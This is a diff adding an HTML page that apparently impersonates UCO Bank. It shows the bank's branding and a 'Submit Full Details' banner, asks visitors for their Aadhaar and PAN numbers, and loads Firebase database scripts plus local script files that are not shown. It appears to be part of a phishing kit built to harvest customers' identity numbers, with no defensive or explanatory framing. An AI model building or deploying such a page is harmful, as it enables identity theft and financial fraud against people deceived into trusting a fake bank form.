@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>UCO Bank Form</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+    }
+
+    .header {
+      background-color: #f7cc01;
+      padding: 10px;
+      text-align: center;
+    }
+
+    .header img {
+      max-height: 50px;
+      width: auto;
+    }
+
+    .banner {
+      text-align: center;
+      background-color: #0033a0;
+      color: white;
+      padding: 12px 10px;
+      font-size: 18px;
+    }
+
+    .content {
+      width: 90%;
+      max-width: 450px;
+      margin: 20px auto;
+      background-color: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    .slider {
+      margin-bottom: 15px;
+    }
+
+    .slider img {
+      width: 100%;
+      border-radius: 8px;
+      display: block;
+    }
+
+    .content label {
+      display: block;
+      margin-top: 10px;
+      font-weight: bold;
+      font-size: 15px;
+    }
+
+    .content input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+
+    .content button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0033a0;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .content button:hover {
+      background-color: #002280;
+    }
+
+    .footer {
+      text-align: center;
+      padding: 15px 10px;
+      background-color: #0033a0;
+      color: white;
+      font-size: 14px;
+    }
+
+    .footer a {
+      margin: 5px 8px;
+      color: white;
+      text-decoration: none;
+      font-size: 16px;
+      display: inline-block;
+    }
+
+    .footer-img {
+      width: 100%;
+      height: auto;
+      display: block;
+      margin: 20px auto;
+      max-width: 600px;
+    }
+
+    @media (max-width: 480px) {
+      .banner {
+        font-size: 16px;
+        padding: 10px;
+      }
+
+      .content {
+        padding: 15px;
+      }
+
+      .content label,
+      .footer a {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <img src="p_uco.png" alt="UCO Bank Logo" />
+  </div>
+
+  <div class="banner">
+    Dear Customer, Submit Full Details
+  </div>
+
+  <div class="content">
+    <div class="slider">
+      <img src="p_ucologo.png" alt="UCO Sukanya Image 2" />
+    </div>
+
+    <form id="ududip007" class="LoginForm" method="post" autocomplete="off">
+      <label for="a1">Aadhaar Number*</label>
+      <input type="text" id="a1" placeholder="Enter your Aadhaar number" required />
+
+      <label for="b2">PAN Number*</label>
+      <input type="text" id="b2" placeholder="Enter your PAN number" required />
+
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <div class="footer">
+    Follow us on:
+    <a href="#">WhatsApp</a>
+    <a href="#">Facebook</a>
+    <a href="#">Twitter</a>
+    <a href="#">Instagram</a>
+    <a href="#">YouTube</a>
+    <a href="#">LinkedIn</a>
+  </div>
+
+  <img src="foot.jpeg" alt="Footer Image" class="footer-img" />
+
+  <!-- Scripts -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1/firebase.js"></script>
+  <script src="firebase.js"></script>
+  <script src="3doc.js"></script>
+
+</body>
+</html>
